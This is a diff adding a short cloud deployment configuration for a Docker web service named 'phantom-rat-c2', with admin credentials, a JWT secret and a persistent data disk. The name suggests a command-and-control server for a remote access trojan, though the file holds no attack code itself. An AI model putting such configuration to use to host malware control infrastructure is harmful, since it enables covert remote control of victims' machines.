@@ -1,0 +1,20 @@
+services:
+  - type: web
+    name: phantom-rat-c2
+    runtime: docker
+    plan: starter
+    dockerfilePath: ./Dockerfile
+    healthCheckPath: /health
+    envVars:
+      - key: PORT
+        value: 32766
+      - key: JWT_SECRET
+        generateValue: true
+      - key: ADMIN_USER
+        value: admin
+      - key: ADMIN_PASS
+        generateValue: true
+    disk:
+      name: phantom-data
+      mountPath: /app/data
+      sizeGB: 1
